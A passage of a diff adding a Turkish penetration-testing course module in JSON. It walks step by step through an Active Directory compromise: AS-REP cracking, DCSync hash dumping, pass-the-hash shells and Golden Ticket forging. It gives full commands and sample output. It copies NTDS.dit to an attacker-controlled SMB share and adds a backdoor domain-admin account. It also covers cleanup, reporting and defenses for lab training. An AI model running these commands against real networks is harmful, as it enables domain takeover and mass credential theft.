+              "command": "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
+              "description": "AS-REP hash'ini kır — mode 18200.",
+              "output": "$krb5asrep$23$jane.smith@CORP.LOCAL:... → Summer2023!"
+            }
+          ]
+        },
+        {
+          "id": "servis-hesap-kullanimi",
+          "type": "advanced",
+          "title": "Servis Hesabıyla Ne Yapılır?",
+          "content": "svc_mssql:Mssql@2020! elde ettik. Bu hesabın değerini analiz et:\n\n### 1. Hangi gruplarda?\n```bash\nnetexec smb 192.168.1.10 -u svc_mssql -p 'Mssql@2020!' --groups\n# Çıktı: Backup Operators, Domain Users\n```\n\n### 2. Makinelerde admin mi?\n```bash\nnetexec smb 192.168.1.0/24 -u svc_mssql -p 'Mssql@2020!' --local-auth\n# Eğer Pwn3d! görünürse o makinede local admin\n```\n\n### 3. MSSQL erişimi var mı? (xp_cmdshell → OS shell)\n```bash\nnetexec mssql 192.168.1.30 -u svc_mssql -p 'Mssql@2020!' -x 'whoami'\n```\n\n### 4. BloodHound'da svc_mssql'i 'owned' işaretle\nYeni yollar açılır mı diye bak — belki svc_mssql ile DCSync hakkı var ya da başka bir yetki zinciri.\n\n**Bu adımda şunları elimizde var:**\n- john.doe:Welcome1! → SRV01'de WinRM shell\n- svc_mssql:Mssql@2020! → muhtemelen MSSQL + bazı makinelerde local admin\n\nHenüz DA değiliz. Sonraki adım: DCSync."
+        }
+      ]
+    },
+    {
+      "id": "dcsync-domain-admin",
+      "title": "DCSync → Tüm Hash'ler → Domain Admin",
+      "description": "DCSync saldırısıyla DC'nin kendi replikasyon protokolünü kullanarak tüm domain hash'lerini çek, Administrator hash'ini al ve pass-the-hash ile DC'ye gir.",
+      "difficulty": "advanced",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "dcsync-theory",
+          "type": "theory",
+          "title": "DCSync Neden Çalışır?",
+          "content": "**DCSync**, bir DC'nin diğer DC'ye replikasyon için 'bana şu kullanıcının hash'ini ver' dediği mekanizmayı (MS-DRSR protokolü) kötüye kullanır.\n\nNormal senaryoda: DC01, DC02'den kullanıcı hash'lerini çeker (replikasyon).\nSaldırı senaryosunda: Kali, DC01'e 'DC02 gibi davranarak' 'bana şu kullanıcının hash'ini ver' der.\n\n**Gereksinim:** Hesabın `GetChanges` **VE** `GetChangesAll` AD hakları olmalı. Normalde bu haklar:\n- Domain Admins\n- Enterprise Admins\n- DC bilgisayar hesapları\n- Bazen yanlışlıkla başka hesaplara da verilmiş (BloodHound'da görünür)\n\n**Eğer svc_mssql veya john.doe'da bu haklar yoksa:** Önce bir DA hesabı ele geçirmemiz lazım. Alternatif yol: Backup Operators grubundaki svc_backup ile DC disk gölge kopyasından NTDS.dit kopyala."
+        },
+        {
+          "id": "dcsync-komutlar",
+          "type": "commands",
+          "title": "Adım 6 — DCSync ile Tüm Hash'leri Dök",
+          "commands": [
+            {
+              "command": "impacket-secretsdump corp.local/svc_mssql:'Mssql@2020!'@192.168.1.10 -just-dc",
+              "description": "DCSync — DC'den tüm kullanıcı hash'lerini çek. -just-dc NTDS.dit'ten sadece domain hash'lerini alır.",
+              "output": "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nadministrator:500:aad3b435b51404eeaad3b435b51404ee:8a4baa2ac0586a3b3abb50f3d378a74c:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\njohn.doe:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\nsvc_mssql:1105:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::\nsvc_backup:1106:aad3b435b51404eeaad3b435b51404ee:c41a843a72932d14e02c7e2e4d28c4b8:::",
+              "tip": "Administrator NTLM hash: 8a4baa2ac0586a3b3abb50f3d378a74c → artık bu hash'i pass-the-hash ile doğrudan kullanabiliriz. Krbtgt hash → Golden Ticket.",
+              "flags": [
+                { "flag": "-just-dc", "description": "Sadece domain hash'leri (NTDS.dit) — LSA, cached, LSA secrets değil" },
+                { "flag": "-just-dc-ntlm", "description": "Sadece NTLM hash'leri — daha hızlı" },
+                { "flag": "-just-dc-user administrator", "description": "Sadece tek kullanıcının hash'i" },
+                { "flag": "-outputfile dump", "description": "Dosyaya yaz" }
+              ]
+            },
+            {
+              "command": "impacket-secretsdump corp.local/svc_mssql:'Mssql@2020!'@192.168.1.10 -just-dc-ntlm | grep -i 'administrator\\|krbtgt'",
+              "description": "Sadece kritik hash'leri filtrele.",
+              "output": "administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4baa2ac0586a3b3abb50f3d378a74c:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::"
+            }
+          ]
+        },
+        {
+          "id": "pth-ve-dc",
+          "type": "commands",
+          "title": "Adım 7 — Pass-the-Hash ile DC'ye Giriş",
+          "content": "Administrator NTLM hash'i elimizde. Parolayı kırmamıza gerek yok — NTLM hash'i **doğrudan kimlik doğrulama** için kullanabiliriz:",
+          "commands": [
+            {
+              "command": "netexec smb 192.168.1.10 -u 'administrator' -H '8a4baa2ac0586a3b3abb50f3d378a74c'",
+              "description": "Pass-the-Hash: NTLM hash'i ile DC'ye karşı kimlik doğrula.",
+              "output": "SMB  192.168.1.10  445  DC01  [+] corp.local\\administrator:8a4baa2ac0586a3b3abb50f3d378a74c (Pwn3d!)"
+            },
+            {
+              "command": "impacket-psexec corp.local/administrator@192.168.1.10 -hashes 'aad3b435b51404eeaad3b435b51404ee:8a4baa2ac0586a3b3abb50f3d378a74c'",
+              "description": "Pass-the-Hash ile DC'de SYSTEM seviyesinde shell aç.",
+              "output": "Impacket v0.12.0 - Copyright 2023 Fortra\n\n[*] Requesting shares on 192.168.1.10.....\n[*] Found writable share ADMIN$\n[*] Uploading file xRtYqZwP.exe\n[*] Opening SVCManager on 192.168.1.10.....\n[*] Creating service qMaB on 192.168.1.10.....\n[*] Starting service qMaB.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.5329]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nDC01"
+            },
+            {
+              "command": "evil-winrm -i 192.168.1.10 -u administrator -H '8a4baa2ac0586a3b3abb50f3d378a74c'",
+              "description": "Alternatif: WinRM üzerinden DA shell — daha temiz, daha az iz.",
+              "output": "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\ncorp\\administrator\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> net group 'Domain Admins'\n\nGroup name     Domain Admins\nMembers:\nadministrator  svc_backup (!!)\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> dir \\\\DC01\\C$\\Users\n  john.doe  Administrator  jane.smith  ...",
+              "tip": "svc_backup Domain Admins grubunda! Kerberoasting'den kırılan o hesap zaten DA'ymış — daha kısa bir yol vardı. BloodHound bunu gösterirdi."
+            }
+          ]
+        },
+        {
+          "id": "alternative-ntds",
+          "type": "advanced",
+          "title": "Alternatif: DCSync Hakkı Yoksa — NTDS.dit'i Fiziksel Kopyala",
+          "content": "DCSync için yetki yoksa ama DC'de SYSTEM shell'imiz varsa NTDS.dit'i doğrudan kopyala:\n\n```powershell\n# Volume Shadow Copy ile NTDS.dit kopyala (kilitli dosyayı bypass)\nvssadmin create shadow /for=C:\nvssadmin list shadows\n# Çıktıdaki shadow copy yolunu kullan:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM\n```\n\nSonra Kali'ye indir ve offline analiz:\n```bash\nsmbserver.py -smb2support share /tmp/loot\n# DC'de:\ncopy C:\\temp\\ntds.dit \\\\192.168.1.100\\share\\\ncopy C:\\temp\\SYSTEM \\\\192.168.1.100\\share\\\n\n# Kali'de:\nimpacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM -outputfile domain_hashes\n```\n\n**Backup Operators yolu (DCSync hakkı yoksa):**\nBackup Operators, VSS ve Backup API'ye erişim için yüksek yetkilidir. svc_backup → Backup Operators → DC'de VSS oluştur → NTDS.dit kopyala → tüm hash'ler.\n\n```bash\nimpacket-secretsdump corp.local/svc_backup:'password'@192.168.1.10 -use-vss\n```"
+        }
+      ]
+    },
+    {
+      "id": "golden-ticket-kalicilik",
+      "title": "Golden Ticket — Kalıcı Erişim ve Kapanış",
+      "description": "krbtgt hash'i elimizde. Golden Ticket ile parola değişse bile 10 yıl geçerli Kerberos bileti oluştur — ve testi nasıl temizler, nasıl raporlarsın.",
+      "difficulty": "advanced",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "golden-theory",
+          "type": "theory",
+          "title": "Golden Ticket Nedir ve Neden Tehlikeli?",
+          "content": "**krbtgt** hesabı, Kerberos'un tüm TGT'leri imzaladığı hesaptır. Tüm Kerberos biletleri bu hesabın hash'i ile doğrulanır.\n\nEğer krbtgt NTLM hash'ini biliyorsan, **istediğin kullanıcı adı ve haklarla** Kerberos bileti oluşturabilirsin. DC, bu bileti geçerli kabul eder — çünkü imzalama anahtarı doğru.\n\n**Neden 'Golden' (altın)?** Herhangi bir hesap sıfırlansa, herhangi bir parola değişse, hatta Administrator hesabı silinse bile **Golden Ticket geçerliliğini korur** (krbtgt parolası değiştirilmedikçe — ve değiştirilmesi nadiren yapılır).\n\n**Gerçek tehlike:** Pentest raporu sunuldu, müşteri 'OK düzelttik' dedi. Ama Golden Ticket kalan saldırganda hâlâ geçerli. Bu yüzden gerçek saldırganlar bunu kalıcılık için kullanır.\n\n**Savunma:** krbtgt parolasını **iki kez** (replikasyon gecikmesi nedeniyle) değiştir. Active Directory sıfırlama prosedürü var: 'krbtgt account password reset'."
+        },
+        {
+          "id": "golden-ticket-komutlar",
+          "type": "commands",
+          "title": "Adım 8 — Golden Ticket Oluştur",
+          "commands": [
+            {
+              "command": "# Önce domain SID'ini öğren:\nimpacket-getPac corp.local/john.doe:'Welcome1!' -targetUser administrator 2>/dev/null | grep 'Domain SID'\n# Ya da:\nlookupsid.py corp.local/john.doe:'Welcome1!'@192.168.1.10 | grep 'Domain SID'",
+              "description": "Golden Ticket için domain SID gerekli.",
+              "output": "Domain SID: S-1-5-21-3623811015-3361044348-30300820"
+            },
+            {
+              "command": "impacket-ticketer -nthash 8846f7eaee8fb117ad06bdd830b7586c -domain-sid S-1-5-21-3623811015-3361044348-30300820 -domain corp.local -groups 512 Administrator",
+              "description": "Golden Ticket oluştur — krbtgt NT hash ile, Domain Admins (512) grubuna dahil, Administrator adına.",
+              "output": "[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for corp.local/Administrator\n[*]  PAC_LOGON_INFO\n[*]  PAC_CLIENT_INFO_TYPE\n[*]  EncTicketPart\n[*]  EncAsRepPart\n[*] Signing/Encrypting final ticket\n[*] Saving ticket in Administrator.ccache",
+              "tip": "-duration 3650 parametresiyle 10 yıl geçerli bilet oluşturulabilir. Pentest'te temizleme zorunlu.",
+              "flags": [
+                { "flag": "-nthash KRBTGT_HASH", "description": "krbtgt NTLM hash'i" },
+                { "flag": "-domain-sid SID", "description": "Domain SID" },
+                { "flag": "-groups 512", "description": "512 = Domain Admins, 519 = Enterprise Admins" },
+                { "flag": "-duration GÜN", "description": "Bilet geçerlilik süresi (default: 10 yıl!)" }
+              ]
+            },
+            {
+              "command": "export KRB5CCNAME=Administrator.ccache\nimpacket-psexec corp.local/Administrator@DC01.corp.local -k -no-pass",
+              "description": "Golden Ticket'ı kullan — parola veya hash gerekmeden DC'de shell.",
+              "output": "C:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> net user hacker P@ssw0rd! /add /domain && net group 'Domain Admins' hacker /add /domain\nThe command completed successfully.",
+              "warning": "Bu son komut örnek amaçlı — pentest'te kalıcılık bırakmadan önce mutlaka müşteri onayı al ve raporla. Test bitince HER artefaktı temizle."
+            }
+          ]
+        },
+        {
+          "id": "temizlik-ve-rapor",
+          "type": "theory",
+          "title": "Adım 9 — Temizlik, Kanıt ve Raporlama",
+          "content": "**Test bitti ama iş bitmedi.** Müşteri shell'ini değil raporu satın aldı.\n\n### Temizlik (Her Artefaktı Geri Al)\n```powershell\n# DC'de:\n# Oluşturduğun test kullanıcıları sil\nnet user hacker /delete /domain\n\n# Yüklediğin dosyaları sil (SharpHound.exe, linpeas, psexec servisleri)\ndel C:\\temp\\SharpHound.exe\ndel C:\\temp\\ntds.dit\n\n# Kalıcılık artefaktları (scheduled task, registry run key, service) temizle\n# Golden Ticket: Krbtgt parolasını iki kez değiştirmeyi müşteriye öner\n```\n\n### Raporlanacak Kritik Bulgular\n| # | Bulgu | CVSS | Etki |\n|---|-------|------|------|\n| 1 | LLMNR Poisoning → Credential Capture | 8.8 (Yüksek) | İç ağda hash yakalama, parola kırma |\n| 2 | Zayıf Servis Hesabı Parolası (Kerberoasting) | 8.1 (Yüksek) | Domain Admin'e yetki yükseltme |\n| 3 | DCSync — Domain Hash Dump | 9.9 (Kritik) | Tüm domain credential'larının sızdırılması |\n| 4 | SMB Signing Devre Dışı | 7.4 (Yüksek) | NTLM Relay saldırısı için zemin |\n| 5 | GPP Parolası SYSVOL'de | 7.8 (Yüksek) | Local admin credential ifşası |\n\n### Saldırı Zinciri Özeti (Rapor için Attack Narrative)\n```\n1. Ağ taraması → DC01 (192.168.1.10) tespit edildi\n2. SMB enumeration → Kullanıcı listesi alındı (null session)\n3. LLMNR zehirleme → john.doe NetNTLMv2 hash'i yakalandı\n4. Hashcat → Welcome1! parolası kırıldı\n5. BloodHound → DA'ya yol haritalandı (svc_mssql → Domain Admins)\n6. Kerberoasting → svc_mssql TGS hash'i alındı → Mssql@2020! kırıldı\n7. DCSync → tüm domain hash'leri dump edildi\n8. Pass-the-Hash → DC01'de Administrator SYSTEM shell\n9. Golden Ticket → kalıcı erişim kanıtlandı\n10. Tüm artefaktlar temizlendi, müşteri bilgilendirildi\n```\n\n**ATT&CK mapping:** T1557.001 (LLMNR), T1558.003 (Kerberoasting), T1003.003 (DCSync), T1550.002 (Pass-the-Hash), T1558 (Golden Ticket)."
+        },
+        {
+          "id": "lab-tam-senaryo",
+          "type": "lab",
+          "title": "Lab: Baştan Sona AD Saldırı Zinciri",
+          "scenario": {
+            "title": "Full AD Pwn — SMB'den Golden Ticket'a",
+            "objective": "Hiç domain hesabı olmadan başla, bu modüldeki tüm adımları sırayla uygula ve DC'de SYSTEM shell ile flag'i oku.",
+            "environment": "HackTheBox: Sauna (AS-REP Roasting odaklı), Forest (tam AD zinciri), Active (Kerberoasting) | TryHackMe: Attacking Active Directory | CRTE/CRTP lab'ları | Kendi lab: 1 DC (Windows Server 2019) + 1 üye sunucu + Kali",
+            "difficulty": "advanced",
+            "steps": [
+              "nmap -p 53,88,389,445,3268,5985 ile DC'yi tespit et. Domain adını not al.",
+              "netexec smb DC_IP -u '' -p '' --pass-pol ile parola politikasını öğren. Lockout threshold'u not al.",
+              "enum4linux veya kerbrute ile kullanıcı listesi çıkar. Servis hesaplarını (svc_*) işaretle.",
+              "responder -I eth0 -rdwv başlat, ağda isim çözümleme trafiği oluşmasını bekle. Hash yakala.",
+              "hashcat -m 5600 ile NetNTLMv2 hash'ini kır. Parolayı netexec ile doğrula.",
+              "bloodhound-python ile AD'yi haritalandır. 'Shortest Paths to DA' sorgusunu çalıştır.",
+              "GetUserSPNs.py ile Kerberoast yap. GetNPUsers.py ile AS-REP Roast dene. Hash'leri kır.",
+              "secretsdump.py ile DCSync yap (yeterli yetki varsa). Administrator ve krbtgt hash'lerini al.",
+              "evil-winrm veya psexec.py ile PtH ile DC'ye gir. whoami → Administrator.",
+              "ticketer.py ile Golden Ticket oluştur ve kullan. DC C:\\Users\\Administrator\\Desktop\\root.txt'i oku.",
+              "Tüm artefaktları temizle ve attack narrative özeti yaz."
+            ],
+            "hints": [
+              "Responder'dan hash gelmiyorsa: laboratuvarda LLMNR trafiği oluşturmak için başka bir VM'den \\\\nonexistent\\share gibi bir UNC yoluna eriş.",
+              "Kerberoast hash'i kırılamazsa şirket adı + yıl kombinasyonlarını dene: hashcat -m 13100 hash.txt -a 3 'Corp?d?d?d?d'",
+              "BloodHound'da 'owned' işaret etmeyi unutma — her ele geçirilen hesabı işaretle, yeni yollar açılır.",
+              "DCSync için yetki yoksa svc_backup Backup Operators'teyse: impacket-secretsdump -use-vss dene.",
+              "Domain SID: impacket-lookupsid ile veya BloodHound'da domain node'una tıklayarak."
+            ],
+            "flag": "C:\\Users\\Administrator\\Desktop\\root.txt veya /root/root.txt (HackTheBox format)",
+            "defenseNote": "LLMNR/NBT-NS: GPO → Computer Config → Windows Settings → Security Settings → Local Policies → Security Options → 'Turn off multicast name resolution' = Enabled. SMB imzalamayı zorunlu kıl. Servis hesaplarına güçlü (24+ karakter) parola + Managed Service Account (gMSA) kullan. Pre-auth'u zorunlu kıl (AS-REP Roasting'i engeller). BloodHound ile kendi AD'ini düzenli analiz et — saldırgan bulduğunu sen önce bul. SIEM: Event 4769 (Kerberoasting), 4768 (AS-REP), 4662 (DCSync GetChanges) alarm olarak tanımla. Tiered admin modeli: DA hesapları sadece DC'ye bağlanmak için kullanılır, iş istasyonunda oturum açılmaz (HasSession zincirini kırar)."
+          }
+        }
+      ]
+    }
+  ]
+}
